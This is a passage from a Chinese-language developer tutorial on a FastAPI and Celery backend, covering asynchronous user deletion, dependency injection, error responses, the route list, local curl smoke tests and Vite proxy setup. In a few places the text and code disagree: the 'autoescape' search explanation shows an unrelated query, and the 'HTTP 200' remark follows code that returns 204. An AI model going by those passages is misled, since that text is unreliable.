    auth_postgres.init()
    try:
        state_store = PostgresUserDeletionStateStore(auth_postgres)
        claimed_at = datetime.now(UTC)
        user_ids = await state_store.claim_due_user_ids(
            claimed_at,
            lease_until=claimed_at + timedelta(seconds=TASK_VISIBILITY_TIMEOUT_SECONDS),
            limit=cfg.lifecycle.cleanup_batch_size,
        )
        dispatched_count = 0
        failed_count = 0
        for user_id in user_ids:
            try:
                enqueue_user_deletion(user_id)
            except Exception as exc:  # noqa: BLE001
                failed_at = datetime.now(UTC)
                await state_store.record_failure(
                    user_id,
                    error=f"{type(exc).__name__}: {exc}",
                    next_attempt_at=failed_at
                    + timedelta(seconds=cfg.lifecycle.user_deletion_retry_seconds),
                )
                failed_count += 1
                logger.exception(f"提交用户注销任务失败并释放领取: user_id={user_id}")
            else:
                dispatched_count += 1
        logger.info(
            "用户注销任务调度完成: "
            f"claimed_count={len(user_ids)}, dispatched_count={dispatched_count}, "
            f"failed_count={failed_count}"
        )
        return dispatched_count
    finally:
        await auth_postgres.close()
```

**这个函数只需要一个资源**（auth 库），因为它只做「领取 + 投递」，不干活。**只初始化需要的东西**——不需要 Doris、不需要沙箱、不需要 Checkpoint。

**投递失败要「释放领取」**：

```python
                await state_store.record_failure(
                    user_id,
                    error=f"{type(exc).__name__}: {exc}",
                    next_attempt_at=failed_at
                    + timedelta(seconds=cfg.lifecycle.user_deletion_retry_seconds),
                )
```

**为什么关键**：`claim_due_user_ids` 把 `next_attempt_at` 推到了租约到期时间（可能是几十分钟后）。如果投递失败（比如 Celery broker 挂了）但不回写，这个用户就要等租约过期才会被重新领取——中间这段时间白白浪费。

**回写把 `next_attempt_at` 拉回到 60 秒后**，下次扫描就能重试。

**统计三个数**：`claimed_count` / `dispatched_count` / `failed_count`。日志里打出来，便于观察队列健康状况。如果 `failed_count` 持续不为 0，说明 broker 有问题。

### 10.3.5 任务提交与查询状态

```python
def enqueue_user_deletion(user_id: int) -> TaskSubmission:
    """提交用户注销清理任务。"""
    task = celery_app.send_task(
        "dataagent.workflows.delete_user",
        args=[user_id],
        queue="lifecycle",
        routing_key="lifecycle",
    )
    submission = TaskSubmission(task_id=task.id)
    logger.info(
        f"用户注销清理任务已提交: task_id={submission.task_id}, user_id={user_id}"
    )
    return submission
```

**注意它和 `dispatch_due_user_deletions_task` 用的是同一个 `enqueue_user_deletion`**。这样「受理时投递」和「定时补投」走同一条代码路径，不会出现行为不一致。

两个任务的装饰器：

```python
@celery_app.task(
    name="dataagent.workflows.delete_user",
    autoretry_for=(Exception,),
    retry_backoff=True,
    retry_jitter=True,
    max_retries=3,
)
def delete_user_task(user_id: int) -> dict[str, object]:
    """执行用户跨存储注销清理。"""
    logger.info(f"开始执行用户跨存储注销清理: user_id={user_id}")
    run_async(_process_user_deletion(user_id))
    logger.info(f"用户跨存储注销清理完成: user_id={user_id}")
    return {"user_id": user_id, "completed": True}


@celery_app.task(name="dataagent.workflows.dispatch_due_user_deletions")
def dispatch_due_user_deletions_task() -> dict[str, int]:
    """提交已到重试时间的用户注销任务。"""
    return {"dispatched_count": run_async(_dispatch_due_user_deletions())}
```

**两个任务的装饰器参数不同**：

- `delete_user_task` 有 `autoretry_for`（干活的，需要重试）。
- `dispatch_due_user_deletions_task` **没有重试**。因为它本身是「被定时调用的」，失败了下一轮 60 秒后就会再跑。加重试反而会让多轮执行叠加。

**这个区别很重要**——「定时任务」不需要 Celery 层的重试，因为「定时」本身就是重试。

## 10.4 测试

### 10.4.1 验证受理（需要完整环境）

```bash
# 拿管理员 token
TOKEN=$(curl -s -X POST http://127.0.0.1:7000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin","password":"<ADMIN_PASSWORD>"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 建一个测试用户
curl -s -X POST http://127.0.0.1:7000/api/v1/admin/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"tmpuser","email":"tmp@example.com","password":"123456","is_admin":false}'

# 注销它
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE \
  http://127.0.0.1:7000/api/v1/admin/users/2 \
  -H "Authorization: Bearer $TOKEN"
```

预期：返回 `204`。

**立即验证「受理即生效」**：

```bash
# 用被注销用户的账号登录：应该 401
curl -s -X POST http://127.0.0.1:7000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"tmpuser","password":"123456"}'
```

预期：`401`，`type: "invalid-credentials"`。**注意此时物理清理可能还没完成**——但用户已经登不上了，因为 `is_active` 已被置 false。

### 10.4.2 验证数据库状态

```bash
# 用户被禁用，注销任务已建
docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT id, username, is_active FROM users WHERE username = 'tmpuser';"

docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT user_id, status, attempt_count, next_attempt_at, last_error
   FROM user_deletion_tasks ORDER BY user_id DESC LIMIT 5;"
```

预期：`is_active` 是 `f`；任务表里有一条 `status='pending'` 的记录。

等 Worker 跑完后：

```bash
docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT count(*) FROM users WHERE username = 'tmpuser';"
```

预期：`0`（用户记录已删）。

```bash
docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT user_id, status FROM user_deletion_tasks ORDER BY user_id DESC LIMIT 5;"
```

预期：`status='completed'`。

### 10.4.3 验证「不能注销自己」和「不能注销最后一个管理员」

```bash
# 用管理员注销自己（假设 admin 的 id 是 1）
curl -s -X DELETE http://127.0.0.1:7000/api/v1/admin/users/1 \
  -H "Authorization: Bearer $TOKEN"
```

预期：返回 400 类错误，`detail` 是「不能注销当前操作的管理员账号」。

**验证最后一个管理员保护**：如果系统里只有一个管理员，用另一个管理员账号去注销他，预期报「不能注销最后一个管理员」。这个检查在 `state_store.request` 里：

```python
                if user.is_active and user.is_admin and await repo.count_admins() <= 1:
                    raise auth_error.LastAdministratorError
```

**注意条件是 `is_active and is_admin and count <= 1`**。如果目标用户已经是 `is_active=False`（已经受理过了），不重复检查——保证重试能通过。

### 10.4.4 验证幂等

手工重复投递同一个任务：

```bash
uv run python -c "
from app.workflows.tasks import delete_user_task
print(delete_user_task(2))
"
```

预期：返回 `{'user_id': 2, 'completed': True}`，但日志里出现「用户注销清理已完成，跳过重复任务: user_id=2」——说明 `is_completed` 短路生效了，没有重复清理。

### 10.4.5 验证定时补投

```bash
uv run python -c "
from app.workflows.tasks import dispatch_due_user_deletions_task
print(dispatch_due_user_deletions_task())
"
```

预期：`{'dispatched_count': 0}`（如果没有到期的任务）。

**手工造一个到期任务**：

```bash
docker exec -it postgres psql -U atguigu -d auth -c \
  "UPDATE user_deletion_tasks SET status='pending', next_attempt_at=now() - interval '1 minute'
   WHERE user_id = 2;"
```

再跑一次上面的命令，预期 `dispatched_count: 1`。

---

# 11. API 接口

## 11.1 相关技术点

在讲具体接口之前，先把三个框架特性讲清楚，它们是读懂所有路由文件的前提。

### 11.1.1 依赖注入：三种生命周期的写法

FastAPI 的 `Depends` 能表达三种不同生命周期的依赖，项目里三种都用了。

**类型一：请求级（用 async 生成器）**

```python
SessionDep = Annotated[
    AsyncSession,
    Depends(auth_postgres_client_manager.get_session),
]
```

```python
    async def get_session(self) -> AsyncIterator[AsyncSession]:
        """获取 FastAPI 请求级数据库会话。"""
        async with self.session() as db_session:
            yield db_session
```

**关键点**：函数体里有 `yield`。`yield` 之前的代码在请求开始时执行，之后（`finally`）在请求结束时执行。所以会话在请求结束后自动关闭。

**类型二：进程级（用 `lru_cache` 或模块级单例）**

```python
@lru_cache(maxsize=1)
def _get_password_manager() -> Argon2PasswordManager:
    """创建进程级密码哈希器。"""
    return Argon2PasswordManager()
```

`lru_cache(maxsize=1)` 让这个函数**永远只返回同一个实例**。适合无状态、创建开销大的对象（Argon2 的 `PasswordHash.recommended()` 要算参数）。

另一种写法是直接返回模块级单例：

```python
def _get_agent_manager() -> AgentManager:
    """获取应用级 Agent 管理器。"""
    return agent_manager
```

**类型三：请求级但需要额外参数的（用 async 生成器 + 手动构造）**

```python
async def _get_role_management_service() -> AsyncGenerator[DorisRoleManagementService]:
    """创建独立会话的 Doris 角色管理服务。"""
    async with auth_postgres_client_manager.session() as session:
        yield DorisRoleManagementService(
            IdentityPGRepo(session),
            DorisRoleRepository(admin_doris_client_manager),
            _get_doris_credential_cipher(),
            query_doris_client_registry,
            _get_password_manager(),
            cfg.auth,
        )
```

这个服务需要一个会话，但**不能用 `SessionDep`**（因为 `SessionDep` 是另一个依赖，多个服务共享同一个会话会互相干扰事务）。所以它自己开一个独立会话。

**注释里写明了原因**：「创建独立会话的 Doris 角色管理服务」。因为角色管理要开事务（`session.begin()`），如果和别的服务共享会话，事务边界会乱。

**依赖的组合**：

```python
async def _require_analysis_access(
    current_user: CurrentUserDep,
    repo: IdentityRepoDep,
) -> AuthenticatedUser:
    """要求当前用户可创建和执行分析。"""
    identity = (
        await repo.get_query_identity(current_user.doris_role_name)
        if current_user.doris_role_name is not None
        else None
    )
    AuthorizationService.require_analysis_access(current_user, identity)
    return current_user


AnalysisUserDep = Annotated[AuthenticatedUser, Depends(_require_analysis_access)]
```

**依赖可以依赖别的依赖**。`AnalysisUserDep` 依赖 `CurrentUserDep`（认证）和 `IdentityRepoDep`（查角色）。FastAPI 会自动按依赖图解析，同一个依赖在一次请求里只执行一次（有缓存）。

**三级权限依赖**：

| 依赖 | 检查什么 | 用在哪 |
| --- | --- | --- |
| `CurrentUserDep` | 有效的 access token | 所有需要登录的接口 |
| `AnalysisUserDep` | 登录 + 绑定了可用的 Doris 角色 | 创建会话、发消息 |
| `AdminUserDep` | 登录 + `is_admin` | 全部管理接口 |

**为什么要区分 `CurrentUserDep` 和 `AnalysisUserDep`**：普通用户可能还没被分配 Doris 角色。他们能登录、能看会话列表、能改密码，但不能发起分析。如果全用 `AnalysisUserDep`，没角色的用户连登录后的首页都进不去。

### 11.1.2 lifespan：进程级资源的初始化

```python
@asynccontextmanager
async def _lifespan(_app: FastAPI):
    """初始化并释放应用进程持有的共享资源。"""
    try:
        logger.info("开始初始化应用资源")
        ...
        yield
    finally:
        logger.info("开始释放应用资源")
        ...
```

**`yield` 之前是启动逻辑，之后是关闭逻辑**。FastAPI 在应用启动时执行到 `yield`，关闭时从 `yield` 之后继续。

**和依赖注入的分工**：

| 机制 | 管什么 | 生命周期 |
| --- | --- | --- |
| `lifespan` | 连接池、Agent 管理器、沙箱管理器、Checkpoint | 进程 |
| `Depends` | 数据库会话、请求级服务 | 请求 |

**为什么连接池不放 `Depends`**：每个请求建一个连接池 = 每个请求建 10 条连接。连接池必须是进程级的。

### 11.1.3 统一错误响应

`main.py` 里注册全局异常处理器：

```python
def _create_app() -> FastAPI:
    """创建并组装 FastAPI 应用。"""
    setup_logger()
    app = FastAPI(lifespan=_lifespan, responses=_ERROR_RESPONSES)
    _register_middlewares(app)
    register_exception_handlers(app)
    _register_routes(app)
    return app
```

`_ERROR_RESPONSES` 声明在应用级，所以**每个接口**的 OpenAPI 文档里都会带这两个错误响应：

```python
_ERROR_RESPONSES = {
    422: {
        **_PROBLEM_RESPONSE,
        "description": "参数校验失败",
    },
    "default": {
        **_PROBLEM_RESPONSE,
        "description": "Problem Details 错误响应",
    },
}
```

**注意用的是 `"default"` 而不是具体状态码**。OpenAPI 里 `"default"` 表示「其它所有未列出的状态码」。这样不用为每个可能的错误码都写一遍。

**路由函数里怎么抛错**：

```python
    try:
        events = await ConversationTurnService(
            repository=conversation_repo,
            lifecycle=lifecycle,
            runs=runs,
            agents=agents,
        ).start(user_id, body.conversation_id, body.message)
    except ConversationMissingError as exc:
        raise chat_error.ConversationNotFoundError from exc
    except ActiveConversationRunError as exc:
        raise chat_error.ConversationRunConflictError from exc
```

**模式是「领域异常 → HTTP 异常」**：

- service 层抛领域异常（`ConversationMissingError`，不继承 `ProblemError`）；
- 路由层捕获并翻译成 `ProblemError` 子类（`ConversationNotFoundError`，带 HTTP 状态码）。

**为什么要翻译**：领域层不应该知道 HTTP。`ConversationMissingError` 是「找不到会话」，可能是 404 也可能是别的语义；`ConversationNotFoundError` 明确是 404。**翻译动作放在路由层，这是分层的价值。**

**用 `from exc` 保留异常链**。这样日志里能看到原始异常，排查时不会丢信息。

## 11.2 代码组织规划

**全部路由清单**（按前缀分组）：

```
/api/v1/auth                     （identity）
  POST   /login                  登录
  POST   /refresh                刷新令牌
  POST   /logout                 登出
  POST   /change-password        改密
  GET    /me                     当前用户

/api/v1/admin                    （identity）
  GET    /users                  用户列表
  POST   /users                  创建用户
  PATCH  /users/{user_id}        更新用户
  DELETE /users/{user_id}        注销用户（异步）
  GET    /doris-roles            角色列表
  POST   /doris-roles            创建角色
  DELETE /doris-roles/{role}     删除角色
  PUT    /doris-roles/default    设置默认角色
  DELETE /doris-roles/default    清除默认角色
  GET    /doris-roles/{role}/assets     资产权限列表
  POST   /doris-roles/{role}/select     授予 SELECT
  DELETE /doris-roles/{role}/select     回收 SELECT
  GET    /doris-roles/{role}/row-policies  行策略列表
  POST   /doris-roles/{role}/row-policies  创建行策略
  DELETE /doris-roles/{role}/row-policies  删除行策略
  POST   /doris-roles/{role}/query-user/rotate  轮换查询用户密码

/api/v1/admin/query-experiences  （query）
  GET    /                       查询经验列表
  GET    /{experience_id}        经验详情
  POST   /disable                批量禁用
  POST   /delete                 批量删除（异步）

/api/v1/chat                     （assistant）
  POST   /create                 创建会话
  DELETE /draft/{conversation_id} 删除草稿
  POST   /delete                 批量删除会话
  POST   /update                 改标题
  GET    /ls                     会话列表
  GET    /ls/{conversation_id}   消息列表
  GET    /{conversation_id}/subagents/{analysis_id}/{agent_type}/{session_id}/runs/{delegation_id}/messages
                                 子 Agent 活动
  POST   /stream                 发消息（SSE）
  POST   /{conversation_id}/resume  恢复（SSE）
  GET    /{conversation_id}/run  运行状态
  GET    /{conversation_id}/events  订阅运行（SSE）
  POST   /{conversation_id}/stop 停止

/api/v1/chat/attachment          （assistant）
  POST   /upload                 上传附件
  GET    /{...}                  下载附件
  POST   /delete                 删除附件

/api/v1/meta                     （metadata）
  POST   /import                 导入 YAML
  GET    /export                 导出 YAML
  GET    /tables                 表列表
  POST   /tables                 新增表
  PATCH  /tables/{t_name}        更新表
  DELETE /tables/{t_name}        删除表
  GET    /columns                字段列表
  POST   /columns                新增字段
  PATCH  /columns/{t_name}/{c_name}  更新字段
  DELETE /columns/{t_name}/{c_name}  删除字段
  GET    /metrics                指标列表
  POST   /metrics                新增指标
  PATCH  /metrics/{name}         更新指标
  DELETE /metrics/{name}         删除指标
  POST   /tables/sync            同步整表字段语义索引
  POST   /columns/sync           同步字段语义索引
  POST   /metrics/sync           同步指标语义索引
  POST   /tables/sync-values     同步整表取值索引
  POST   /columns/sync-values    同步字段取值索引

/api/v1/tasks                    （identity）
  GET    /{task_id}              后台任务状态
```

**路由文件的组织原则**：

| 文件 | 内容 | 行数级别 |
| --- | --- | --- |
| `app/identity/api/auth/router.py` | 5 个认证接口 | ~70 |
| `app/identity/api/admin/router.py` | 用户 + 角色 + 权限 + 行策略 | ~370 |
| `app/identity/api/admin/task_router.py` | 任务状态（单独文件，因为前缀不同） | ~30 |
| `app/assistant/api/chat/router.py` | 会话 + SSE | ~450 |
| `app/assistant/api/attachment/router.py` | 附件 | — |
| `app/metadata/api/meta/router.py` | 元数据全部接口 | ~460 |
| `app/query/api/admin/router.py` | 查询经验管理 | ~150 |

**拆分依据是「前缀」而不是「功能数量」**。同一个前缀下的接口放一个文件，即使功能跨度大（比如 admin 里既有用户又有角色）。

**唯一的例外**是 `task_router.py`——它的前缀是 `/api/v1/tasks`（不是 `/api/v1/admin`），但它属于 identity 模块（因为任务状态查询依赖 `celery_app` 和 `AdminUserDep`）。**前缀决定了文件位置，不是模块归属。**

## 11.3 具体实现

### 11.3.1 路由注册

```python
def _register_routes(app: FastAPI) -> None:
    """注册接口。"""
    app.include_router(auth_router, prefix="/api/v1/auth")
    app.include_router(admin_router, prefix="/api/v1/admin")
    app.include_router(
        query_experience_admin_router,
        prefix="/api/v1/admin/query-experiences",
    )
    app.include_router(chat_router, prefix="/api/v1/chat")
    app.include_router(
        attachment_router,
        prefix="/api/v1/chat/attachment",
    )
    app.include_router(meta_router, prefix="/api/v1/meta")
    app.include_router(task_router, prefix="/api/v1/tasks")
```

**注意 `/api/v1/admin/query-experiences` 挂的是 `query` 模块的 router**。跨模块挂载在 FastAPI 里很自然——`include_router` 不关心 router 定义在哪个文件。

**这个设计的好处**：查询经验管理的代码在 `app/query/` 里（和它的服务、模型在一起），但 URL 归到 `/admin` 下（符合管理接口的语义）。不需要为了 URL 结构把代码搬来搬去。

### 11.3.2 一个完整的接口实现（以改密为例）

看 identity 的认证路由：

```python
@router.post("/login", response_model=schemas.TokenResponse)
async def login(
    body: schemas.LoginRequest,
    service: AuthServiceDep,
    rate_limit: AuthRateLimitServiceDep,
    request: Request,
) -> schemas.TokenResponse:
    """使用用户名或邮箱登录。"""
    await rate_limit.check_login(get_client_ip(request), body.identifier)
    user, token_pair = await service.login(
        body.identifier,
        body.password.get_secret_value(),
    )
    return schemas.TokenResponse.from_result(user, token_pair)
```

**这个函数只有 8 行**，因为所有逻辑都在 service 里。它做三件事：

1. **限流**（`rate_limit.check_login`）——放在最前，因为这是最便宜的检查。
2. **调服务**（`service.login`）——拿密码时要 `.get_secret_value()`，因为请求模型里是 `SecretStr`。
3. **组装响应**（`TokenResponse.from_result`）——用类方法而不是手工构造字段，这样字段变化只改一处。

**`get_client_ip(request)` 用的是 `request.client.host`**：

```python
def get_client_ip(request: Request) -> str:
    """读取 ASGI 连接提供的客户端地址。"""
    return request.client.host if request.client is not None else "unknown"
```

**注意这和追踪中间件里的 `_get_client_ip` 是两个函数**：

| 函数 | 位置 | 取什么 | 用途 |
| --- | --- | --- | --- |
| `trace._get_client_ip` | `app/shared/observability/trace.py` | 优先 `X-Forwarded-For` | 日志 |
| `dependencies.get_client_ip` | `app/identity/api/auth/dependencies.py` | 只用 `request.client.host` | **限流** |

**限流不能用可伪造的头**。这是安全边界。

**响应模型的构造**：

```python
    @classmethod
    def from_result(cls, user: User, token_pair: TokenPair) -> Self:
        """从认证结果构造响应。"""
        return cls(
            access_token=token_pair.access_token,
            refresh_token=token_pair.refresh_token,
            expires_in=token_pair.access_expires_in,
            refresh_expires_in=token_pair.refresh_expires_in,
            user=UserResponse.from_user(user),
        )
```

**`token_type: str = "bearer"` 有默认值**，所以不用传。

### 11.3.3 请求模型的校验

所有请求模型都用 `extra="forbid"`：

```python
class UpdateUserRequest(BaseModel):
    """管理员更新用户信息请求。"""

    model_config = ConfigDict(extra="forbid")

    username: str | None = None
    email: str | None = None
    password: SecretStr | None = None
    doris_role: str | None = Field(default=None)
    is_admin: bool | None = Field(default=None)

    @field_validator("doris_role")
    @classmethod
    def normalize_role(cls, role: str | None) -> str | None:
        """校验 Doris 角色名。"""
        return normalize_doris_role_name(role) if role else None

    @model_validator(mode="after")
    def validate_updates(self) -> Self:
        """要求至少更新一个字段，并限制空值只用于清除 Doris 角色。"""
        if not self.model_fields_set:
            raise ValueError("至少需要提供一个待更新字段")

        nullable_updates = {"username", "email", "password", "is_admin"}
        null_fields = [
            field_name
            for field_name in nullable_updates & self.model_fields_set
            if getattr(self, field_name) is None
        ]
        if null_fields:
            raise ValueError(f"更新字段不能为 null: {', '.join(sorted(null_fields))}")
        return self
```

**PATCH 语义的两种写法**：

| 写法 | 语义 | 问题 |
| --- | --- | --- |
| 用 `exclude_unset=True` | 只更新传入的字段 | 无法区分「没传」和「传了 null」 |
| **用 `model_fields_set` 检查** | 显式判断哪些字段被传了 | 代码稍多，但语义精确 |

这里用第二种。`model_fields_set` 是 Pydantic 提供的「实际传入的字段集合」，能区分：

- 没传 `username` → 不在 `model_fields_set` 里 → 不改；
- 传了 `username: null` → 在集合里且值为 `None` → **报错**（除了 `doris_role`）。

**为什么 `doris_role` 允许 null**：清除用户的角色绑定是合法操作。其余字段传 null 是没意义的（用户名不能是 null）。

### 11.3.4 SSE 接口的 OpenAPI 声明

```python
@router.post(
    "/stream",
    response_class=StreamingResponse,
    responses={
        200: {
            "model": chat_schema.ChatStreamEvent,
            "description": "每个 SSE data 帧均为 ChatStreamEvent JSON",
            "content": {
                "text/event-stream": {
                    "schema": {"$ref": "#/components/schemas/ChatStreamEvent"}
                }
            },
        }
    },
)
```

**这段声明让前端能生成正确的类型**。`web/src/api/generated.ts` 是从 OpenAPI 生成的，如果没有这段声明，前端拿到的返回类型会是 `any`。

**事件模型的判别联合**：

```python
ChatStreamEventPayload = Annotated[
    ChatStreamMessageEvent
    | ChatStreamThinkingEvent
    | ChatStreamMessageDeltaEvent
    | ChatStreamErrorEvent
    | ChatStreamDoneEvent
    | ChatStreamSubagentMessageEvent
    | ChatStreamSubagentThinkingEvent
    | ChatStreamSubagentMessageDeltaEvent
    | ChatStreamSubagentStatusEvent,
    Field(discriminator="type"),
]


class ChatStreamEvent(RootModel[ChatStreamEventPayload]):
    """单个 SSE data 帧的 JSON 事件。"""
```

**`Field(discriminator="type")` 是 Pydantic 的可辨识联合**。它让反序列化时按 `type` 字段自动选正确的模型，而不是逐个试。这在有 9 个变体时能显著提速，也让错误信息更准确。

**`RootModel` 包装**是因为 OpenAPI 需要「这个 schema 本身就是一个对象」而不是「一个 union」。直接给 union 有些代码生成器处理不好。

### 11.3.5 幂等删除的响应设计

```python
@router.delete(
    "/draft/{conversation_id}",
    status_code=status.HTTP_204_NO_CONTENT,
)
async def api_delete_draft_conversation(
    conversation_id: UUID,
    current_user: CurrentUserDep,
    lifecycle: ConversationLifecycleServiceDep,
) -> Response:
    """幂等删除当前用户主动放弃的草稿会话。"""
    requested = await _request_deletion_or_raise(
        lifecycle,
        current_user.id,
        conversation_id,
        draft_only=True,
    )
    if requested:
        try:
            enqueue_conversation_deletion(current_user.id, conversation_id)
        except Exception:  # noqa: BLE001
            logger.exception(
                f"提交草稿删除任务失败，等待定时补偿: conversation_id={conversation_id}"
            )
    return Response(status_code=status.HTTP_204_NO_CONTENT)
```

**三个设计点**：

1. **204 而不是 200**。删除成功没有响应体。
2. **幂等**。`_request_deletion_or_raise` 返回 `False`（会话不存在或不是草稿）时**也返回 204**，不报 404。因为「删除一个不存在的草稿」和「删除一个已删除的草稿」对用户来说结果一样——都不存在了。
3. **任务提交失败不影响响应**。墓碑已写（会话立即消失），任务提交失败由 Beat 补投。

**「受理」和「完成」的语义区分**在注释里写得很清楚：「幂等删除当前用户主动放弃的草稿会话」。**HTTP 200 表示「已受理」而不是「已完成」**——这是异步删除的常见语义，前端不需要等。

### 11.3.6 异常翻译的统一模式

```python
async def _request_deletion_or_raise(
    lifecycle: ConversationLifecycleService,
    user_id: int,
    conversation_id: UUID,
    *,
    draft_only: bool = False,
) -> bool:
    """受理会话删除，并把锁冲突转换为稳定的业务错误。"""
    try:
        return await lifecycle.request_conversation_deletion(
            user_id,
            conversation_id,
            draft_only=draft_only,
        )
    except ConversationLifecycleBusyError as exc:
        raise chat_error.ConversationBusyError(
            detail="对话正在运行或清理，请稍后重试",
        ) from exc
```

**这是「抽取重复的异常翻译逻辑」的典型**。三个删除接口（批量删除、删草稿、删除单个）都要做同样的翻译，抽成一个函数。

**错误信息是给用户看的**（「对话正在运行或清理，请稍后重试」），不是给开发看的。用户看到这个知道该等一会儿再试。

### 11.3.7 分页与过滤

查询经验列表接口：

```python
    overviews, total = await service.list_overviews(
        limit=limit,
        offset=offset,
        role_name=role_name,
        status=status,
        query=query,
    )
```

**参数设计**：

| 参数 | 类型 | 作用 |
| --- | --- | --- |
| `limit` / `offset` | int | 分页 |
| `role_name` | str \| None | 按 Doris 角色过滤 |
| `status` | str \| None | 按经验状态过滤 |
| `query` | str \| None | 关键词搜索 |

**为什么用 `limit`/`offset` 而不是游标**：查询经验的总量不大（几十到几千条），offset 分页足够。游标分页在数据量大且频繁变动时才必要。

**搜索用 `icontains(autoescape=True)`**：

```python
        result = await self._session.execute(
            select(QueryExperience.id, QueryExperience.revision)
            .where(QueryExperience.indexed_revision < QueryExperience.revision)
            .order_by(QueryExperience.updated_at)
            .limit(limit)
        )
```

**`autoescape=True` 很关键**——用户输入的 `%` 和 `_` 是 SQL LIKE 的通配符。不转义的话，搜索 `100%` 会匹配所有以 `100` 开头的内容。

## 11.4 运行测试

### 11.4.1 查看接口文档

```bash
make run
```

打开 <http://127.0.0.1:7000/docs>。

**验证三件事**：

1. 所有接口都在，前缀正确。
2. 错误响应显示为 `ProblemDetails` schema（点开任一接口的 Responses 部分）。
3. SSE 接口的 200 响应显示 `ChatStreamEvent`。

### 11.4.2 完整的接口冒烟测试

```bash
BASE=http://127.0.0.1:7000/api/v1

# 1. 登录
TOKEN=$(curl -s -X POST $BASE/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin","password":"<ADMIN_PASSWORD>"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "token: ${TOKEN:0:20}..."

# 2. 当前用户
curl -s $BASE/auth/me -H "Authorization: Bearer $TOKEN" | python -m json.tool

# 3. 用户列表（管理员）
curl -s "$BASE/admin/users?limit=10&offset=0" -H "Authorization: Bearer $TOKEN" | python -m json.tool

# 4. 元数据表列表
curl -s "$BASE/meta/tables" -H "Authorization: Bearer $TOKEN" | python -m json.tool | head -30

# 5. 会话列表
curl -s "$BASE/chat/ls" -H "Authorization: Bearer $TOKEN" | python -m json.tool
```

预期：每步都返回 200 且 JSON 结构符合文档。

### 11.4.3 验证错误响应格式

**401（未认证）**：

```bash
curl -s -i $BASE/auth/me | head -20
```

预期：

```
HTTP/1.1 401 Unauthorized
content-type: application/problem+json
...
{"type":"authentication-required","title":"需要认证","status":401,...}
```

**注意 `content-type` 是 `application/problem+json`**，不是 `application/json`。这是 RFC 9457 的要求，也是前端区分「业务错误」和「意外错误」的依据。

**422（参数校验失败）**：

```bash
curl -s -X POST $BASE/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin"}'
```

预期：422，`type` 是参数校验相关，`detail` 里说明缺了 `password`。

**404（资源不存在）**：

```bash
curl -s $BASE/chat/ls/00000000-0000-0000-0000-000000000000 \
  -H "Authorization: Bearer $TOKEN"
```

预期：404，`type: "conversation-not-found"`。

### 11.4.4 验证 429 限流

```bash
for i in $(seq 1 12); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST $BASE/auth/login \
    -H "Content-Type: application/json" \
    -d '{"identifier":"admin","password":"wrong"}'
done; echo
```

预期：前 10 个 `401`，之后 `429`。

**查看 429 的响应体**：

```bash
curl -s -X POST $BASE/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin","password":"wrong"}'
```

预期：`{"type":"rate-limit-exceeded","title":"请求过于频繁","status":429,"detail":"...","retry_after_seconds":<n>}`。

**`retry_after_seconds` 是扩展字段**——这就是 `ProblemDetails` 要 `extra="allow"` 的原因。

### 11.4.5 验证 SSE 接口

```bash
CONV_ID=$(curl -s -X POST $BASE/chat/create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_draft":false}' | python -c "import sys,json; print(json.load(sys.stdin)['conversation_id'])")

curl -N -X POST "$BASE/chat/stream" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"conversation_id\":\"$CONV_ID\",\"message\":{\"parts\":[{\"type\":\"text\",\"text\":\"你好\"}]}}"
```

`-N` 是禁用 curl 的输出缓冲，能看到流式效果。预期输出：

```
data: {"type":"thinking",...}

data: {"type":"message_delta",...}

data: {"type":"done"}

```

**每帧之间有空行**（SSE 协议的帧分隔符）。

### 11.4.6 验证后台任务状态接口

```bash
# 提交一个元数据导入任务，拿到 task_id
TASK_ID=$(curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -F "file=@conf/meta_config.yaml" \
  "$BASE/meta/import?mode=merge&dry_run=true" | \
  python -c "import sys,json; d=json.load(sys.stdin); print(d.get('task_id',''))")
echo "task_id: $TASK_ID"

# dry_run 不产生任务，所以这里应该是空的。真实导入才有 task_id
curl -s "$BASE/tasks/$TASK_ID" -H "Authorization: Bearer $TOKEN" | python -m json.tool
```

预期：`dry_run=true` 时返回的是变更摘要（同步执行），没有 `task_id`。改成 `dry_run=false` 才会有。

**真实导入后的任务状态**：

```json
{
  "task_id": "...",
  "state": "SUCCESS",
  "ready": true,
  "successful": true,
  "result": {"...": "..."},
  "error": null
}
```

`state` 是 Celery 的状态字符串（`PENDING` / `STARTED` / `SUCCESS` / `FAILURE` / `RETRY`）。

---

# 12. 前后端联调

## 12.1 启动前端项目

### 12.1.1 环境变量

```bash
cp web/.env.example web/.env
```

`web/.env.example` 全文（逐字）：

```dotenv
VITE_APP_PROXY=http://localhost:7000
```

**只有一行**——前端只需要知道后端地址。

### 12.1.2 Vite 配置

```typescript
export default defineConfig(({ mode }) => {
  const environment = loadEnv(mode, process.cwd(), "");
  const proxyTarget = environment.VITE_APP_PROXY || "http://localhost:7000";
  return {
    plugins: [react()],
    resolve: {
      alias: {
        "@": path.resolve(__dirname, "./src"),
      },
    },
    server: {
      port: VITE_SERVER_PORT,
      proxy: {
        "/api": {
          target: proxyTarget,
          changeOrigin: true,
        },
      },
    },
  };
});
```

三个要点：

1. **`loadEnv(mode, process.cwd(), "")` 第三个参数是空字符串**。默认 `loadEnv` 只加载 `VITE_` 前缀的变量，传空字符串表示**加载全部**环境变量。这样如果将来加了非 `VITE_` 前缀的变量也能读到。

2. **代理规则 `/api` → `VITE_APP_PROXY`**。前端代码里所有请求都写 `/api/v1/...`，开发时被 Vite 代理到后端。**这就是为什么后端 `cors_origins` 可以是空列表**——浏览器看到的是同源请求。

